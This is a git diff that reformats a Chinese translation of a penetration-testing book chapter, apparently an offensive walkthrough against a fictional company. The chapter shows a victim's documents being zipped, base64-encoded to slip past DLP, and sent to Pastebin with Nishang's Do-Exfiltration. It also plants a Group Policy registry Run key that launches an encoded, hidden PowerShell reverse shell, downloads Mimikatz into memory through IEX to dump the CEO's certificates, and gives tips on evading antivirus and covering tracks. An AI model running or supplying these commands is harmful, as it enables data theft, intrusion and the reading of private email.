@@ -26,28 +26,30 @@
 PS> Get-ChildItem C:\users\Rachel\documents | Compress-Archive -DestinationPath c:\users\Rachel\documents.zip
 ```
 
-提示：要设置一个密码，并在目标机上安装7zip和使用此PowerShell脚本[http://blog.danskingdom.com/powershell-function-to-create-passwordprotectedzip-file。](http://blog.danskingdom.com/powershell-function-to-create-passwordprotectedzip-file。)
+> 提示：要设置一个密码，并在目标机上安装7zip和使用此PowerShell脚本：[http://blog.danskingdom.com/powershell-function-to-create-passwordprotectedzip-file](http://blog.danskingdom.com/powershell-function-to-create-passwordprotectedzip-file)
 
 然而，窃取此zip文件可能会被 DLP 系统捕获，该DLP系统可以解压缩文件来查找带标签的文档。如果无法解压文件，系统可能会阻止它外传。这就是为什么我们需要添加另一个欺骗手段：即将这个显而易见的zip文件转换成一个普通的旧文本文件，使得它能通过任何DLP系统。
 
-我们可以使用Windows本地命令“certutil -encode”，用base64对压缩的文档进行编码，然后将生成的文本文件发送到一个上传服务器。 不过，Nishang 提供的 Do-Exulation.ps1 \[74\] 工具可以自动执行此操作，节省了几分钟的代码。 该工具有两个主要选项:
-
+我们可以使用Windows本地命令“certutil -encode”，用base64对压缩的文档进行编码，然后将生成的文本文件发送到一个上传服务器。 不过，Nishang 提供的 Do-Exulation.ps1工具可以自动执行此操作，节省了几分钟的代码。 该工具有两个主要选项:
 * 通过 HTTPS 将数据传输到我们控制的Web服务器。
 * 将数据嵌入到发送到我们的 DNS 服务器的 DNS 查询中。这是绕过防火墙规则和代理过滤的一种非常聪明的方法，因为这些防护工具必须允许 DNS 传输。
 
 我们将使用第一个选项，因为它提供了一个有趣的选项，可以直接将数据上传到 Pastebin.com，所以我们不必担心设置web服务器。
 
-我们在 Pastebin 上设置一个帐户，并获得一个API密钥\(以下称为dev\_key\)。然后，我们使用以下命令执行Do- Exfiltering:
+我们在 Pastebin 上设置一个帐户，并获得一个API密钥\(以下称为dev\_key\)。然后，我们使用以下命令执行Do-Exfiltering:
 
 ```text
-PS> C:\users\Rachel> Get-content documents.zip | Do- Exfiltration -ExfilOption pastebin -dev_key 0d19a7649774b35181f0d008f1824435 username paste_user_13 -password paste_password_13
+PS> C:\users\Rachel> Get-content documents.zip | Do-Exfiltration -ExfilOption pastebin -dev_key 0d19a7649774b35181f0d008f1824435 username paste_user_13 -password paste_password_13
 ```
 
 如您所见，我们可以直接从PasteBin获取文件。
 
 ![PasteBin &#x793A;&#x610F;&#x56FE;](.gitbook/assets/5.1-1.jpg)
 
-为了恢复压缩的文档，我们下载了文本文件，然后在 Linux 上使用 base64 命令对其进行解码。 `FrontGun$ cat data.txt | base64 -d > documents.zip`
+为了恢复压缩的文档，我们下载了文本文件，然后在 Linux 上使用 base64 命令对其进行解码：
+```
+FrontGun$ cat data.txt | base64 -d > documents.zip
+```
 
 现在我们知道如何获取数据了,让我们来进一步挖掘一些价值!
 
@@ -77,7 +79,7 @@ PowerView.ps1 \[75\] 使用 Invoke-ShareFinder 提供了相同的选项，该工
 
  ![xxx&#x793A;&#x610F;&#x56FE;](.gitbook/assets/5.2-1.jpg) 
 
-提示：我们使用invoke-expression（IEX）加载脚本，以免触发防病毒系统告警。
+> 提示：我们使用invoke-expression（IEX）加载脚本，以免触发防病毒系统告警。
 
 我们将所需的任何目录复制到我们控制的Windows服务器上，将其压缩并使用前面介绍的技术进行窃取。 通常我们可以得到足够的网络共享数据，使整个公司蒙羞七次，直到星期日。
 
@@ -104,13 +106,14 @@ pwdlastset    : 12/29/2016 9:27:08 PM
 […]
 ```
 
-提示：我们使用invoke-expression（IEX）加载脚本，以免触发防病毒系统告警。 `PS> Get-AdUser -properties Department -Filter 'department -Like "HR"'` 
+> 提示：我们使用invoke-expression（IEX）加载脚本，以免触发防病毒系统告警。 ` PS> Get-AdUser -properties Department -Filter 'department -Like "HR"' `
 
 我们重复此过程来列出公司内部的所有其他主要群组：ExCom，Marketing，Accounting等。获取用户名后，我们可以通过查找其工作站的 IP/name 来追踪它们。
 
 最可靠的方法是分析域控上成功的网络连接日志。它通常包含用户登录的最后一台计算机。
 
-PowerView 提供了 Invoke-EventHunter 模块来轻松完成此任务： `PS > Invoke-EventHunter -username Juliette` 
+PowerView 提供了 Invoke-EventHunter 模块来轻松完成此任务： 
+`PS > Invoke-EventHunter -username Juliette`
 
 `Juliette` 最后一次使用了工作站FRPC066\(10.10.20.66\)。我们尝试远程访问她的工作站的默认共享文件夹，但最终被本地防火墙阻止:
 
@@ -148,18 +151,15 @@ powershell.exe -NoP -sta -NonI -W Hidden -Enc WwBTAHkAUwB0AGUAbQAuAE4ARQBUAC4AUw
 然后，指示我们创建的 GPO 在下一次 Juliette 的计算机轮询新设置时设置“运行”注册表项。 此注册表项将在 Juliette 的下次登录时执行 PowerShell 代理：
 
 ```text
-PS> Set-GPRegistryValue -Name "WindowsUpdate" -key "HKEY_CURRENT_USER\Software\Microsoft\Windows
--ValueName MSstart -Type String -value "powershell.exe
--NoP -sta -NonI -Enc WwBTAHk[…]"
+PS> Set-GPRegistryValue -Name "WindowsUpdate" -key "HKEY_CURRENT_USER\Software\Microsoft\Windows -ValueName MSstart -Type String -value "powershell.exe -NoP -sta -NonI -Enc WwBTAHk[…]"
 ```
 
-我们耐心等待，直到最终，我们的反向shell连接成功
-
+我们耐心等待，直到最终，我们的反向shell连接成功：
  ![xxx&#x793A;&#x610F;&#x56FE;](.gitbook/assets/5.2-3.jpg) 
 
 进入工作站后，我们几乎可以执行如前所述的相同操作来窃取数据。
 
-提示：为了避免引起怀疑，我们将尽快清理GPO策略和注册表项；我们选择修改注册表以执行脚本，但是，如果将RDP发送到域控制器，则可以有更大的选择范围（部署脚本，.msi文件等）。 由于事件日志将记录此交互式会话，因此该方法也不够隐秘。
+> 提示：为了避免引起怀疑，我们将尽快清理GPO策略和注册表项；我们选择修改注册表以执行脚本，但是，如果将RDP发送到域控制器，则可以有更大的选择范围（部署脚本，.msi文件等）。 由于事件日志将记录此交互式会话，因此该方法也不够隐秘。
 
 ## 5.3 邮件
 
@@ -170,21 +170,20 @@ PS> Set-GPRegistryValue -Name "WindowsUpdate" -key "HKEY_CURRENT_USER\Software\M
 * C:\Users\eric\AppData\Local\Microsoft\Outlook
 * C:\Documents and Settings\eric\Local Settings\Application Data\Microsoft\Outlook
 
-首席执行官的电脑不像 Juliette 的那么封闭，所以我们只安装远程共享 \FRPC074\C$，使用域管理凭证并访问他的所有文件。我们复制 eric.blackie@sph- assets.com 的OST文件到我们的 Front Gun 服务器，查看CEO 发送或接收的每一封电子邮件。
+首席执行官的电脑不像 Juliette 的那么封闭，所以我们只安装远程共享 `\\FRPC074\C$`，使用域管理凭证并访问他的所有文件。我们复制 eric.blackie@sph-assets.com 的OST文件到我们的 Front Gun 服务器，查看CEO 发送或接收的每一封电子邮件。
 
 然而，当我们使用常规工具打开OST文件时\[77\]，我们无法查看大多数敏感邮件。我们的CEO似乎使用了s/MIME 加密来保护他的邮件。
 
 
 
-{% hint style="info" %}
-**s/MIME**
+> **s/MIME简介**
+>
+>s/MIME 是一种基于公钥基础设施的安全交换电子邮件的标准协议。简单言之，每个用户都有一个公钥和私钥。当用户A向用户B发送电子邮件时，A使用B的公钥对内容进行加密。因为只有用户B拥有可以反加密的私钥，所以只有用户B可以查看电子邮件。
+>
+>对于签名，则执行相反的过程。用户A使用自己的私钥对邮件进行签名，由于用户B可以访问A的公钥，所以用户B可以对签名进行反向验证其真实性。 
+>
+>现在这个方案过于简化，没有涉及混合加密、密钥仪式、密钥交换、证书颁发机构等，因为它们对我们的案例研究来说无关紧要\[78\]。
 
-s/MIME 是一种基于公钥基础设施的安全交换电子邮件的标准协议。简单言之，每个用户都有一个公钥和私钥。当用户A向用户B发送电子邮件时，A使用B的公钥对内容进行加密。因为只有用户B拥有可以反加密的私钥，所以只有用户B可以查看电子邮件。
-
- 对于签名，则执行相反的过程。用户A使用自己的私钥对邮件进行签名，由于用户B可以访问A的公钥，所以用户B可以对签名进行反向验证其真实性。 
-
-现在这个方案过于简化，没有涉及混合加密、密钥仪式、密钥交换、证书颁发机构等，因为它们对我们的案例研究来说无关紧要\[78\]。
-{% endhint %}
 
 目前的问题是 Eric 的私钥存储在他的机器上。但是我们不能访问它，即使有管理员权限，因为 Windows 将它标记为“不可导出”……我们该如何处理呢?
 
@@ -195,14 +194,11 @@ mimikatz 再次营救！多么棒的工具！我们在 CEO 的计算机上运行
 ```text
 PS> $browser = New-Object System.Net.WebClient
 PS> $browser.Proxy.Credentials = [System.Net.CredentialCache]::DefaultNetworkCredential
-PS>
-IEX($browser.DownloadString("https://raw.githubusercon Mimikatz.ps1"))
+PS> IEX($browser.DownloadString("https://raw.githubusercon Mimikatz.ps1"))
 PS> invoke-mimikatz -DumpCerts
 ```
 
-
-
-![xxx&#x793A;&#x610F;&#x56FE;](https://github.com/xncoder/HackPornstar/tree/d9c01c00001f788ed4497e9f5ec1f4fc077d3117/Chap5/5.3-2.jpg) 
+![](.gitbook/assets/5.3-2.jpg)
 
 我们在 Front Gun 机器上安装证书，然后就可以慢慢欣赏解密后的 CEO 电子邮件了！
 
